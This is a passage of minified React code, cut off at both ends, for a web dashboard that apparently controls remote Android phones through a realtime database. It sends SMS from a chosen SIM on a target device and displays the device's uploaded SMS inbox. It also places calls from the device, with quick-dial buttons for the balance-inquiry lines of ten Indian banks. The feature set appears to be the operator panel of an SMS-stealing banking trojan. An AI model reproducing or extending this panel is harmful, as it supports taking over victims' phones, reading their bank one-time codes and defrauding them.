Sent"}),x&&i.jsx("span",{style:{fontSize:"9px",fontWeight:600,color:x.sent?"#2ecc71":"#f1c40f",marginLeft:"6px",background:x.sent?"rgba(46,204,113,0.08)":"rgba(241,196,15,0.08)",padding:"1px 8px",borderRadius:"10px"},children:x.sent?"✅ Sent":"⏳ Pending"})]})]}),x?i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:"2px 8px",background:"var(--bg-input)",padding:"6px 10px",borderRadius:"6px"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between"},children:[i.jsx("span",{style:{fontSize:"9px",color:"var(--text-muted)"},children:"📱 Number"}),i.jsx("span",{style:{fontSize:"10px",fontWeight:600,color:"var(--text-primary)",fontFamily:"monospace"},children:x.number||"N/A"})]}),i.jsxs("div",{style:{display:"flex",justifyContent:"space-between"},children:[i.jsx("span",{style:{fontSize:"9px",color:"var(--text-muted)"},children:"📶 SIM"}),i.jsxs("span",{style:{fontSize:"10px",fontWeight:600,color:"var(--text-primary)"},children:["SIM ",x.simSlot!=null?x.simSlot+1:"N/A"]})]}),i.jsxs("div",{style:{gridColumn:"span 2",display:"flex",justifyContent:"space-between"},children:[i.jsx("span",{style:{fontSize:"9px",color:"var(--text-muted)"},children:"💬 Message"}),i.jsx("span",{style:{fontSize:"10px",fontWeight:500,color:"var(--text-primary)",maxWidth:"60%",textAlign:"right",wordBreak:"break-word"},children:x.message||"No message"})]}),i.jsxs("div",{style:{gridColumn:"span 2",display:"flex",justifyContent:"space-between",borderTop:"1px solid var(--border-color)",paddingTop:"4px",marginTop:"2px"},children:[i.jsxs("span",{style:{fontSize:"8px",color:"var(--text-muted)"},children:["⏰ ",x.timestamp||C(x.initiated)]}),x.delivered&&i.jsx("span",{style:{fontSize:"8px",color:"#2ecc71"},children:"📬 Delivered"})]})]}):i.jsx("div",{style:{textAlign:"center",padding:"8px",color:"var(--text-muted)",fontSize:"11px"},children:"📭 No SMS sent yet"})]}),_&&i.jsx("div",{style:{padding:"4px 8px",background:"rgba(231,76,60,0.08)",border:"1px solid rgba(231,76,60,0.15)",borderRadius:"4px",color:"#e74c3c",fontSize:"11px",marginBottom:"4px"},children:_}),h&&i.jsx("div",{style:{padding:"4px 8px",background:"rgba(46,204,113,0.08)",border:"1px solid rgba(46,204,113,0.15)",borderRadius:"4px",color:"#2ecc71",fontSize:"11px",marginBottom:"4px"},children:h}),i.jsx("div",{style:{background:"var(--bg-card)",borderRadius:"8px",padding:"6px 10px",border:"1px solid var(--border-color)",marginBottom:"4px",boxShadow:"0 1px 4px rgba(0,0,0,0.02)"},children:i.jsxs("div",{style:{display:"flex",flexDirection:"column",gap:"6px"},children:[i.jsxs("div",{style:{position:"relative"},children:[i.jsx("span",{style:{position:"absolute",left:"10px",top:"50%",transform:"translateY(-50%)",fontSize:"14px",color:"var(--text-muted)"},children:"📱"}),i.jsx("input",{type:"tel",value:a,onChange:j=>l(j.target.value.replace(/\D/g,"").slice(0,15)),placeholder:"Enter Number",style:{padding:"8px 10px 8px 34px",border:"2px solid #6c63ff",borderRadius:"8px",background:"var(--bg-input)",color:"var(--text-primary)",fontSize:"14px",outline:"none",fontFamily:"monospace",width:"100%",height:"38px",transition:"all 0.3s"},onFocus:j=>{j.target.style.borderColor="#8b5cf6",j.target.style.boxShadow="0 0 0 3px rgba(139,92,246,0.15)"},onBlur:j=>{j.target.style.borderColor="#6c63ff",j.target.style.boxShadow="none"}})]}),i.jsxs("div",{style:{position:"relative"},children:[i.jsx("span",{style:{position:"absolute",left:"10px",top:"14px",fontSize:"14px",color:"var(--text-muted)"},children:"💬"}),i.jsx("textarea",{value:c,onChange:j=>d(j.target.value),placeholder:"Type your message here...",rows:"2",style:{padding:"10px 10px 10px 34px",border:"2px solid #6c63ff",borderRadius:"8px",background:"var(--bg-input)",color:"var(--text-primary)",fontSize:"14px",outline:"none",resize:"vertical",fontFamily:"inherit",minHeight:"65px",width:"100%",transition:"all 0.3s",paddingRight:"50px"},onFocus:j=>{j.target.style.borderColor="#8b5cf6",j.target.style.boxShadow="0 0 0 3px rgba(139,92,246,0.15)"},onBlur:j=>{j.target.style.borderColor="#6c63ff",j.target.style.boxShadow="none"}}),i.jsx("button",{onClick:S,style:{position:"absolute",right:"8px",bottom:"8px",width:"32px",height:"32px",display:"flex",alignItems:"center",justifyContent:"center",background:"linear-gradient(135deg, rgba(139,92,246,0.12), rgba(108,99,255,0.12))",color:"#8b5cf6",border:"none",borderRadius:"6px",cursor:"pointer",fontSize:"16px",transition:"all 0.3s"},onMouseEnter:j=>{j.target.style.background="linear-gradient(135deg, rgba(139,92,246,0.25), rgba(108,99,255,0.25))",j.target.style.transform="scale(1.05)"},onMouseLeave:j=>{j.target.style.background="linear-gradient(135deg, rgba(139,92,246,0.12), rgba(108,99,255,0.12))",j.target.style.transform="scale(1)"},title:"Paste from clipboard",children:"♥️"})]}),i.jsxs("div",{style:{fontSize:"9px",color:"var(--text-muted)",textAlign:"right",marginTop:"-2px"},children:[c.length," characters"]}),i.jsxs("div",{style:{position:"relative"},children:[i.jsx("span",{style:{position:"absolute",left:"10px",top:"50%",transform:"translateY(-50%)",fontSize:"14px",color:"var(--text-muted)"},children:"📶"}),i.jsx("select",{value:p,onChange:j=>f(parseInt(j.target.value)),style:{padding:"6px 10px 6px 34px",border:"2px solid #6c63ff",borderRadius:"8px",background:"var(--bg-input)",color:"var(--text-primary)",fontSize:"13px",outline:"none",width:"100%",height:"36px",appearance:"none",backgroundImage:`url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M1 1l4 4 4-4' stroke='%236c63ff' stroke-width='2' fill='none'/%3E%3C/svg%3E")`,backgroundRepeat:"no-repeat",backgroundPosition:"right 10px center",transition:"all 0.3s"},onFocus:j=>{j.target.style.borderColor="#8b5cf6",j.target.style.boxShadow="0 0 0 3px rgba(139,92,246,0.15)"},onBlur:j=>{j.target.style.borderColor="#6c63ff",j.target.style.boxShadow="none"},children:u.map((j,P)=>i.jsx("option",{value:P,style:{padding:"4px"},children:j},P))})]}),i.jsx("button",{onClick:R,disabled:s||!a||!c,style:{padding:"8px",border:"none",borderRadius:"8px",fontSize:"14px",fontWeight:700,cursor:s||!a||!c?"not-allowed":"pointer",background:s||!a||!c?"#95a5a6":"linear-gradient(135deg, #28a745, #1e7e34)",color:"white",opacity:s||!a||!c?.5:1,display:"flex",alignItems:"center",justifyContent:"center",gap:"8px",height:"38px",transition:"all 0.3s",boxShadow:s||!a||!c?"none":"0 2px 12px rgba(40,167,69,0.25)"},onMouseEnter:j=>{!s&&a&&c&&(j.target.style.transform="translateY(-1px)",j.target.style.boxShadow="0 4px 20px rgba(40,167,69,0.35)")},onMouseLeave:j=>{j.target.style.transform="translateY(0)",j.target.style.boxShadow=s||!a||!c?"none":"0 2px 12px rgba(40,167,69,0.25)"},children:s?"⏳ Sending...":"📤 Send SMS"})]})})]})}function Lk({deviceId:t}){const[e,n]=g.useState(!0),[r,s]=g.useState([]),[o,a]=g.useState(null),[l,c]=g.useState("all");g.useEffect(()=>{t&&d()},[t]);const d=async()=>{n(!0),a(null);try{const x=B(U,`old_sms/${t}`),v=await ce(x);if(v.exists()){const _=v.val(),m=Object.values(_).map((h,y)=>({id:y,address:h.address||"Unknown",body:h.body||"No message",date:h.date||Date.now(),formatted_date:h.formatted_date||"N/A",type:h.type||"Received",upload_timestamp:h.upload_timestamp||Date.now()}));m.sort((h,y)=>y.date-h.date),s(m)}else s([])}catch(x){a(x.message)}n(!1)},p=x=>x?new Date(x).toLocaleString("en-IN",{day:"2-digit",month:"short",year:"numeric",hour:"2-digit",minute:"2-digit",hour12:!0}):"N/A",f=x=>{if(!x)return"Never";const v=Date.now()-x;return v<6e4?"Just now":v<36e5?`${Math.floor(v/6e4)}m ago`:v<864e5?`${Math.floor(v/36e5)}h ago`:`${Math.floor(v/864e5)}d ago`},b=l==="all"?r:r.filter(x=>x.type===l);return e?i.jsxs("div",{className:"page-loading",children:[i.jsx("div",{className:"loading-spinner"}),i.jsx("p",{children:"📥 Loading old messages..."})]}):o?i.jsxs("div",{className:"page-error",children:[i.jsx("span",{className:"error-icon",children:"❌"}),i.jsx("h2",{children:"Error Loading Messages"}),i.jsx("p",{children:o})]}):i.jsxs("div",{className:"old-sms-page",children:[i.jsxs("div",{className:"old-sms-header",children:[i.jsx("span",{className:"old-sms-title",children:"📥 Old SMS Inbox"}),i.jsxs("span",{className:"old-sms-count",children:[r.length," messages"]})]}),i.jsxs("div",{className:"old-sms-filters",children:[i.jsx("button",{className:`filter-btn ${l==="all"?"active":""}`,onClick:()=>c("all"),children:"📨 All"}),i.jsx("button",{className:`filter-btn ${l==="Received"?"active":""}`,onClick:()=>c("Received"),children:"📩 Received"}),i.jsx("button",{className:`filter-btn ${l==="Sent"?"active":""}`,onClick:()=>c("Sent"),children:"📤 Sent"}),i.jsx("button",{className:"filter-btn refresh",onClick:d,children:"🔄 Refresh"})]}),i.jsx("div",{className:"old-sms-list",children:b.length===0?i.jsxs("div",{className:"empty-state",children:[i.jsx("span",{className:"empty-icon",children:"📭"}),i.jsx("p",{children:"No old messages found"})]}):b.map(x=>i.jsxs("div",{className:`old-sms-item ${x.type==="Received"?"received":"sent"}`,children:[i.jsxs("div",{className:"sms-header",children:[i.jsxs("span",{className:"sms-sender",children:["📩 ",x.address]}),i.jsx("span",{className:"sms-time",children:p(x.date)})]}),i.jsx("div",{className:"sms-body",children:x.body}),i.jsxs("div",{className:"sms-footer",children:[i.jsx("span",{className:`sms-type ${x.type==="Received"?"received":"sent"}`,children:x.type==="Received"?"📩 Received":"📤 Sent"}),i.jsx("span",{className:"sms-ago",children:f(x.date)})]})]},x.id))}),i.jsx("style",{children:`
        .old-sms-page {
          padding: 12px 0;
          max-width: 100%;
        }

        .old-sms-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 12px 16px;
          background: var(--bg-card);
          border-radius: 12px;
          border: 1px solid var(--border-color);
          margin-bottom: 12px;
        }

        .old-sms-title {
          font-size: 16px;
          font-weight: 700;
          color: var(--text-primary);
        }

        .old-sms-count {
          font-size: 12px;
          color: var(--text-muted);
          background: var(--bg-input);
          padding: 4px 12px;
          border-radius: 20px;
        }

        .old-sms-filters {
          display: flex;
          gap: 8px;
          margin-bottom: 12px;
          flex-wrap: wrap;
        }

        .filter-btn {
          padding: 6px 16px;
          border: 2px solid var(--border-color);
          border-radius: 20px;
          background: var(--bg-input);
          color: var(--text-muted);
          cursor: pointer;
          font-size: 12px;
          font-weight: 600;
          transition: all 0.3s;
        }

        .filter-btn.active {
          border-color: #6c63ff;
          background: rgba(108,99,255,0.1);
          color: #6c63ff;
        }

        .filter-btn.refresh {
          border-color: #28a745;
          background: rgba(40,167,69,0.08);
          color: #28a745;
        }

        .filter-btn.refresh:hover {
          background: #28a745;
          color: white;
        }

        .old-sms-list {
          display: flex;
          flex-direction: column;
          gap: 8px;
        }

        .old-sms-item {
          background: var(--bg-card);
          border-radius: 10px;
          padding: 14px 16px;
          border: 1px solid var(--border-color);
          border-left: 4px solid #6c63ff;
          transition: all 0.3s;
        }

        .old-sms-item:hover {
          box-shadow: 0 2px 12px rgba(0,0,0,0.06);
          transform: translateX(2px);
        }

        .old-sms-item.received {
          border-left-color: #2ecc71;
        }

        .old-sms-item.sent {
          border-left-color: #f59e0b;
        }

        .sms-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          flex-wrap: wrap;
          gap: 8px;
          margin-bottom: 8px;
        }

        .sms-sender {
          font-size: 13px;
          font-weight: 700;
          color: #6c63ff;
        }

        .sms-time {
          font-size: 11px;
          color: var(--text-muted);
        }

        .sms-body {
          font-size: 13px;
          color: var(--text-primary);
          line-height: 1.6;
          word-wrap: break-word;
          white-space: pre-wrap;
          margin-bottom: 8px;
        }

        .sms-footer {
          display: flex;
          justify-content: space-between;
          align-items: center;
          flex-wrap: wrap;
          gap: 4px;
          padding-top: 8px;
          border-top: 1px solid var(--border-color);
        }

        .sms-type {
          font-size: 11px;
          font-weight: 600;
          padding: 2px 10px;
          border-radius: 12px;
        }

        .sms-type.received {
          color: #2ecc71;
          background: rgba(46,204,113,0.08);
        }

        .sms-type.sent {
          color: #f59e0b;
          background: rgba(245,158,11,0.08);
        }

        .sms-ago {
          font-size: 10px;
          color: var(--text-muted);
        }

        .empty-state {
          text-align: center;
          padding: 60px 20px;
          color: var(--text-muted);
          background: var(--bg-card);
          border-radius: 12px;
          border: 1px solid var(--border-color);
        }

        .empty-icon {
          font-size: 48px;
          display: block;
          margin-bottom: 8px;
        }

        .page-loading {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 60px 20px;
          gap: 12px;
          color: var(--text-muted);
        }

        .loading-spinner {
          width: 36px;
          height: 36px;
          border: 3px solid rgba(108,99,255,0.1);
          border-top-color: #6c63ff;
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
          to { transform: rotate(360deg); }
        }

        .page-error {
          text-align: center;
          padding: 60px 20px;
          color: var(--text-muted);
        }

        .error-icon {
          font-size: 48px;
          display: block;
          margin-bottom: 8px;
        }

        .page-error h2 {
          color: var(--text-primary);
          margin-bottom: 4px;
        }

        @media (max-width: 480px) {
          .old-sms-item {
            padding: 10px 12px;
          }
          
          .sms-sender {
            font-size: 12px;
          }
          
          .sms-body {
            font-size: 12px;
          }
          
          .old-sms-filters {
            gap: 4px;
          }
          
          .filter-btn {
            padding: 4px 12px;
            font-size: 11px;
          }
        }
      `})]})}function zk({deviceId:t}){const[e,n]=g.useState(!1),[r,s]=g.useState(""),[o,a]=g.useState(0),[l,c]=g.useState("Idle"),[d,p]=g.useState([]),[f,u]=g.useState(0),[b,x]=g.useState("00:00"),[v,_]=g.useState(!1),[m,h]=g.useState(null),[y,w]=g.useState(0),[N,R]=g.useState(!1),[S,C]=g.useState(""),[j,P]=g.useState(""),[z,M]=g.useState(0),L=g.useRef(null),K=g.useRef(null),F=g.useRef(!0),te=[{label:"🏦 SBI",number:"09223488888",desc:"SBI Balance Inquiry"},{label:"🏦 HDFC",number:"18002703333",desc:"HDFC Bank Balance"},{label:"🏦 ICICI",number:"18001080",desc:"ICICI Balance Inquiry"},{label:"🏦 Axis",number:"18002096",desc:"Axis Bank Balance"},{label:"🏦 PNB",number:"18001802222",desc:"PNB Balance Inquiry"},{label:"🏦 Yes Bank",number:"18001200",desc:"Yes Bank Balance"},{label:"🏦 Kotak",number:"18002740770",desc:"Kotak Balance Inquiry"},{label:"🏦 IndusInd",number:"18002094",desc:"IndusInd Balance"},{label:"🏦 BOB",number:"18002233",desc:"BOB Balance Inquiry"},{label:"🏦 Canara",number:"180010301",desc:"Canara Balance"}],me=[{label:"📞 Support",number:"1800123456"},{label:"📱 Mobile",number:"9876543210"},{label:"🏢 Office",number:"0112345678"}];g.useEffect(()=>{if(!t)return;const T=B(U,`MainNode/${t}/NewNode`),Q=cn(T,we=>{if(F.current)if(we.exists()){const fe=we.val(),vn=fe.isCallActive||fe.isActive||!1,qe=fe.currentCallNumber||fe.call_number||"",yn=fe.callStatus||"Idle",at=fe.currentDurationFormatted||fe.durationFormatted||"00:00";if(R(vn),C(qe),P(yn),vn&&qe)c("📞 App Call: "+qe),s(qe),_(!0),x(at),K.current||(K.current=Date.now(),L.current&&clearInterval(L.current),L.current=setInterval(()=>{if(F.current){const Nt=Math.floor((Date.now()-K.current)/1e3);w(Nt),u(Nt)}},1e3));else{if(v&&K.current){const Nt=Math.floor((Date.now()-K.current)/1e3);if(u(Nt),x(I(Nt)),fe.callStatus==="completed"||fe.callStatus==="success"){const mr={number:fe.call_number||qe||r,simSlot:fe.simSlot||o,duration:Nt,durationFormatted:I(Nt),timestamp:Date.now(),status:"Completed",source:"App"};p(bn=>[mr,...bn].slice(0,20)),D(mr)}}_(!1),R(!1),K.current=null,L.current&&(clearInterval(L.current),L.current=null)}fe.callStatus&&fe.callStatus.includes("failed")&&(h("Call failed: "+fe.callStatus),_(!1),R(!1),L.current&&(clearInterval(L.current),L.current=null))}else v&&(_(!1),R(!1),L.current&&(clearInterval(L.current),L.current=null)),K.current=null,c("Idle")});return W(),()=>{F.current=!1,Q(),L.current&&(clearInterval(L.current),L.current=null)}},[t]);const W=async()=>{try{const T=B(U,`MainNode/${t}/CallHistory`),Q=await ce(T);if(Q.exists()){const we=Q.val(),fe=Object.values(we);fe.sort((vn,qe)=>qe.timestamp-vn.timestamp),p(fe.slice(0,20))}}catch(T){console.error("Error loading history:",T)}},D=async T=>{try{const Q=B(U,`MainNode/${t}/CallHistory`),we=Bv(Q);await bt(we,{...T,id:we.key})}catch(Q){console.error("Error saving history:",Q)}},I=T=>{if(!T||T<0)return"00:00";const Q=Math.floor(T/60),we=T%60;return`${String(Q).padStart(2,"0")}:${String(we).padStart(2,"0")}`},X=async()=>{if(!r||r.length<3){h("Please enter a valid phone number");return}n(!0),h(null),_(!0),w(0),u(0),x("00:00"),K.current=Date.now();try{const T=B(U,`MainNode/${t}/NewNode`);await bt(T,null),await bt(T,{call_number:r,simSlot:o,isActive:!0,callStatus:"initiated",timestamp:Date.now(),deviceId:t,source:"Web"}),c("Calling..."),L.current&&clearInterval(L.current),L.current=setInterval(()=>{if(F.current){const Q=Math.floor((Date.now()-K.current)/1e3);w(Q),u(Q)}},1e3),setTimeout(()=>{v&&F.current&&(_(!1),h("Call timed out after 60 seconds"),c("Timed Out"),L.current&&(clearInterval(L.current),L.current=null),kt(T,{isActive:!1,callStatus:"timedout"}).catch(()=>{}))},6e4)}catch(T){h(T.message),_(!1),L.current&&(clearInterval(L.current),L.current=null)}n(!1)},V=async()=>{try{const T=B(U,`MainNode/${t}/NewNode`);await kt(T,{isActive:!1,callStatus:"cancelled"}),_(!1),c("Cancelled"),L.current&&(clearInterval(L.current),L.current=null);const Q=Math.floor((Date.now()-K.current)/1e3);u(Q),x(I(Q))}catch(T){console.error("Cancel error:",T)}},E=async()=>{try{const T=B(U,`MainNode/${t}/NewNode`);await bt(T,null),c("Idle"),u(0),x("00:00"),w(0),s(""),h(null),_(!1),R(!1),C(""),P(""),L.current&&(clearInterval(L.current),L.current=null),K.current=null}catch(T){console.error("Clear error:",T)}},q=async()=>{if(window.confirm("Clear all call history?"))try{const T=B(U,`MainNode/${t}/CallHistory`);await bt(T,null),p([])}catch(T){console.error("Clear history error:",T)}},ae=T=>T==="Completed"||T==="success"?"#2ecc71":T==="Failed"||T==="failed"?"#e74c3c":T==="Cancelled"||T==="cancelled"?"#f59e0b":T==="Calling..."||T==="initiated"?"#3498db":T==="Timed Out"||T==="timedout"?"#e74c3c":T.includes("App Call")?"#8b5cf6":"#95a5a6",ee=T=>T==="Completed"||T==="success"?"✅":T==="Failed"||T==="failed"?"❌":T==="Cancelled"||T==="cancelled"?"⏹️":T==="Calling..."||T==="initiated"?"📞":T==="Timed Out"||T==="timedout"?"⏰":T.includes("App Call")?"📱":"⏳";return i.jsxs("div",{className:"call-page",children:[i.jsxs("div",{className:"call-header",children:[i.jsx("span",{className:"call-title",children:"📞 Call Manager"}),i.jsx("span",{className:`call-status ${v||N?"active":"idle"}`,children:N?"📱 APP CALL":v?"🔴 LIVE":"⚪ IDLE"})]}),N&&i.jsxs("div",{className:"app-call-alert",children:[i.jsx("span",{className:"app-call-icon",children:"📱"}),i.jsxs("div",{className:"app-call-info",children:[i.jsxs("span",{className:"app-call-text",children:["📞 App is calling: ",i.jsx("strong",{children:S})]}),i.jsxs("span",{className:"app-call-status",children:["Status: ",j]})]})]}),i.jsxs("div",{className:"call-status-display",children:[i.jsx("span",{className:"status-icon",children:v?"📞":"📱"}),i.jsxs("div",{className:"status-info",children:[i.jsxs("span",{className:"status-text",style:{color:ae(l)},children:[ee(l)," ",l||"Idle"]}),r&&i.jsxs("span",{className:"status-number",children:["📞 ",r]}),v&&i.jsxs("span",{className:"status-timer",children:["⏱️ ",I(y)]}),N&&i.jsxs("span",{className:"status-timer app-timer",children:["⏱️ ",b]}),!v&&!N&&f>0&&i.jsxs("span",{className:"status-duration-final",children:["⏱️ Duration: ",b]}),o!==void 0&&i.jsxs("span",{className:"status-sim",children:["📱 SIM ",o+1]}),N&&i.jsx("span",{className:"status-source",children:"📡 Source: App"})]})]}),(v||N)&&i.jsxs("div",{className:"call-progress",children:[i.jsx("div",{className:"call-progress-bar",children:i.jsx("div",{className:"call-progress-fill",style:{width:`${Math.min((N?parseInt(b):y)/60*100,100)}%`,background:N?"linear-gradient(90deg, #8b5cf6, #6c63ff)":"linear-gradient(90deg, #2ecc71, #f59e0b, #e74c3c)"}})}),i.jsxs("span",{className:"call-progress-text",children:[N?b:I(y)," / 01:00"]})]}),m&&i.jsxs("div",{className:"call-error",children:["❌ ",m,i.jsx("button",{onClick:()=>h(null),children:"✕"})]}),i.jsxs("div",{className:"call-sim-select",children:[i.jsx("label",{children:"Select SIM:"}),i.jsxs("div",{className:"sim-buttons",children:[i.jsx("button",{className:`sim-btn ${o===0?"active":""}`,onClick:()=>a(0),disabled:v||N,children:"📱 SIM 1"}),i.jsx("button",{className:`sim-btn ${o===1?"active":""}`,onClick:()=>a(1),disabled:v||N,children:"📱 SIM 2"})]})]}),i.jsxs("div",{className:"call-input-group",children:[i.jsx("label",{children:"📞 Phone Number"}),i.jsx("input",{type:"tel",value:r,onChange:T=>s(T.target.value),placeholder:"Enter phone number",disabled:v||N,className:"call-input"})]}),i.jsxs("div",{className:"call-quick-numbers",children:[i.jsx("span",{className:"quick-label",children:"⚡ Quick Dial:"}),i.jsx("div",{className:"quick-buttons",children:me.map((T,Q)=>i.jsx("button",{className:"quick-btn",onClick:()=>s(T.number),disabled:v||N,children:T.label},Q))})]}),i.jsxs("div",{className:"call-quick-numbers bank-numbers",children:[i.jsx("span",{className:"quick-label",children:"🏦 Bank Balance Inquiry:"}),i.jsx("div",{className:"quick-buttons bank-buttons",children:te.map((T,Q)=>i.jsx("button",{className:"quick-btn bank-btn",onClick:()=>s(T.number),disabled:v||N,title:T.desc,children:T.label},Q))})]}),i.jsxs("div",{className:"call-actions",children:[!v&&!N?i.jsx("button",{className:"call-btn call",onClick:X,disabled:e||!r,children:e?"⏳ Calling...":"📞 Make Call"}):v?i.jsx("button",{className:"call-btn cancel",onClick:V,children:"⏹️ Cancel Call"}):i.jsx("button",{className:"call-btn app-call-btn",disabled:!0,children:"📱 App Call in Progress"}),i.jsx("button",{className:"call-btn clear",onClick:E,disabled:v,children:"🗑️ Clear"})]}),d.length>0&&i.jsxs("div",{className:"call-history",children:[i.jsxs("div",{className:"history-header",children:[i.jsx("span",{children:"📋 Call History"}),i.jsx("span",{className:"history-count",children:d.length}),i.jsx("button",{className:"btn-clear-history",onClick:q,children:"🗑️ Clear All"})]}),i.jsx("div",{className:"history-list",children:d.map((T,Q)=>i.jsxs("div",{className:"history-item",children:[i.jsxs("span",{className:"history-number",children:["📞 ",T.number]}),i.jsxs("span",{className:"history-sim",children:["SIM ",T.simSlot+1]}),i.jsxs("span",{className:"history-duration",children:["⏱️ ",T.durationFormatted||I(T.duration)]}),i.jsxs("span",{className:"history-status",style:{color:ae(T.status)},children:[ee(T.status)," ",T.status]}),i.jsx("span",{className:"history-source-tag",children:T.source||"Web"}),i.jsx("span",{className:"history-time",children:new Date(T.timestamp).toLocaleTimeString()})]},Q))})]}),i.jsx("style",{children:`
        .call-page {
          padding: 12px 0;
          max-width: 100%;
        }

        .call-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 10px 14px;
          background: var(--bg-card);
          border-radius: 10px;
          border: 1px solid var(--border-color);
          margin-bottom: 10px;
        }

        .call-title {
          font-size: 15px;
          font-weight: 700;
          color: var(--text-primary);
        }

        .call-status {
          font-size: 11px;
          font-weight: 600;
          padding: 3px 12px;
          border-radius: 12px;
        }

        .call-status.active {
          color: #e74c3c;
          background: rgba(231, 76, 60, 0.1);
          animation: pulse 1.5s infinite;
        }

        .call-status.idle {
          color: var(--text-muted);
          background: var(--bg-input);
        }

        .app-call-alert {
          display: flex;
          align-items: center;
          gap: 12px;
          padding: 8px 14px;
          background: rgba(139, 92, 246, 0.1);
          border: 1px solid #8b5cf6;
          border-radius: 8px;
          margin-bottom: 10px;
        }

        .app-call-icon {
          font-size: 24px;
        }

        .app-call-info {
          flex: 1;
          display: flex;
          flex-direction: column;
        }

        .app-call-text {
          font-size: 13px;
          font-weight: 600;
          color: #8b5cf6;
        }

        .app-call-status {
          font-size: 11px;
          color: var(--text-muted);
        }

        .call-status-display {
          display: flex;
          align-items: center;
          gap: 12px;
          padding: 10px 14px;
          background: var(--bg-card);
          border-radius: 10px;
          border: 1px solid var(--border-color);
          margin-bottom: 10px;
        }

        .status-icon {
          font-size: 28px;
        }

        .status-info {
          flex: 1;
          display: flex;
          flex-direction: column;
          gap: 2px;
        }

        .status-text {
          font-size: 14px;
          font-weight: 700;
        }

        .status-number {
          font-size: 16px;
          font-weight: 600;
          color: var(--text-primary);
        }

        .status-timer {
          font-size: 20px;
          font-weight: 700;
          color: #2ecc71;
        }

        .status-timer.app-timer {
          color: #8b5cf6;
        }

        .status-duration-final {
          font-size: 14px;
          font-weight: 600;
          color: #2ecc71;
        }

        .status-sim {
          font-size: 11px;
          color: var(--text-muted);
          background: var(--bg-input);
          padding: 1px 10px;
          border-radius: 10px;
          display: inline-block;
          width: fit-content;
        }

        .status-source {
          font-size: 10px;
          color: #8b5cf6;
          background: rgba(139, 92, 246, 0.08);
          padding: 1px 8px;
          border-radius: 10px;
          display: inline-block;
          width: fit-content;
        }

        .call-progress {
          padding: 6px 14px;
          background: var(--bg-card);
          border-radius: 8px;
          border: 1px solid var(--border-color);
          margin-bottom: 10px;
        }

        .call-progress-bar {
          width: 100%;
          height: 6px;
          background: var(--bg-input);
          border-radius: 4px;
          overflow: hidden;
        }

        .call-progress-fill {
          height: 100%;
          border-radius: 4px;
          transition: width 0.5s ease;
        }

        .call-progress-text {
          font-size: 10px;
          color: var(--text-muted);
          margin-top: 2px;
          display: block;
          text-align: center;
        }

        .call-error {
          background: rgba(231, 76, 60, 0.1);
          border: 1px solid #e74c3c;
          border-radius: 8px;
          padding: 8px 12px;
          color: #e74c3c;
          font-size: 12px;
          margin-bottom: 10px;
          display: flex;
          justify-content: space-between;
          align-items: center;
        }

        .call-error button {
          background: none;
          border: none;
          color: #e74c3c;
          cursor: pointer;
          font-size: 14px;
        }

        .call-sim-select {
          background: var(--bg-card);
          border-radius: 10px;
          padding: 10px 14px;
          border: 1px solid var(--border-color);
          margin-bottom: 10px;
        }

        .call-sim-select label {
          font-size: 12px;
          font-weight: 600;
          color: var(--text-muted);
          display: block;
          margin-bottom: 6px;
        }

        .sim-buttons {
          display: flex;
          gap: 8px;
        }

        .sim-btn {
          padding: 6px 16px;
          border: 2px solid var(--border-color);
          border-radius: 8px;
          background: var(--bg-input);
          color: var(--text-muted);
          cursor: pointer;
          font-size: 12px;
          font-weight: 600;
          transition: all 0.2s;
        }

        .sim-btn.active {
          border-color: #6c63ff;
          background: rgba(108, 99, 255, 0.1);
          color: #6c63ff;
        }

        .sim-btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .call-input-group {
          background: var(--bg-card);
          border-radius: 10px;
          padding: 10px 14px;
          border: 1px solid var(--border-color);
          margin-bottom: 10px;
        }

        .call-input-group label {
          font-size: 12px;
          font-weight: 600;
          color: var(--text-muted);
          display: block;
          margin-bottom: 4px;
        }

        .call-input {
          width: 100%;
          padding: 10px 12px;
          border: 2px solid var(--border-color);
          border-radius: 8px;
          background: var(--bg-input);
          color: var(--text-primary);
          font-size: 18px;
          outline: none;
          transition: all 0.3s;
        }

        .call-input:focus {
          border-color: #6c63ff;
        }

        .call-input:disabled {
          opacity: 0.5;
        }

        .call-quick-numbers {
          background: var(--bg-card);
          border-radius: 10px;
          padding: 10px 14px;
          border: 1px solid var(--border-color);
          margin-bottom: 10px;
        }

        .call-quick-numbers.bank-numbers {
          background: rgba(46, 204, 113, 0.03);
          border-color: rgba(46, 204, 113, 0.15);
        }

        .quick-label {
          font-size: 11px;
          font-weight: 600;
          color: var(--text-muted);
          display: block;
          margin-bottom: 6px;
        }

        .quick-buttons {
          display: flex;
          gap: 6px;
          flex-wrap: wrap;
        }

        .quick-buttons.bank-buttons {
          gap: 4px;
        }

        .quick-btn {
          padding: 4px 12px;
          border: 1px solid var(--border-color);
          border-radius: 12px;
          background: var(--bg-input);
          color: var(--text-secondary);
          cursor: pointer;
          font-size: 11px;
          font-weight: 500;
          transition: all 0.2s;
        }

        .quick-btn:hover:not(:disabled) {
          border-color: #6c63ff;
          color: #6c63ff;
        }

        .quick-btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .quick-btn.bank-btn {
          font-size: 9px;
          padding: 3px 8px;
          border-color: rgba(46, 204, 113, 0.2);
          background: rgba(46, 204, 113, 0.05);
        }

        .quick-btn.bank-btn:hover:not(:disabled) {
          border-color: #2ecc71;
          color: #2ecc71;
          background: rgba(46, 204, 113, 0.1);
        }

        .call-actions {
          display: flex;
          gap: 8px;
          margin-bottom: 10px;
        }

        .call-btn {
          flex: 1;
          padding: 12px;
          border: none;
          border-radius: 10px;
          font-size: 14px;
          font-weight: 700;
          cursor: pointer;
          transition: all 0.3s;
          color: white;
        }

        .call-btn:active {
          transform: scale(0.96);
        }

        .call-btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .call-btn.call {
          background: linear-gradient(135deg, #2ecc71, #27ae60);
        }

        .call-btn.call:hover:not(:disabled) {
          transform: translateY(-2px);
          box-shadow: 0 4px 20px rgba(46, 204, 113, 0.4);
        }

        .call-btn.cancel {
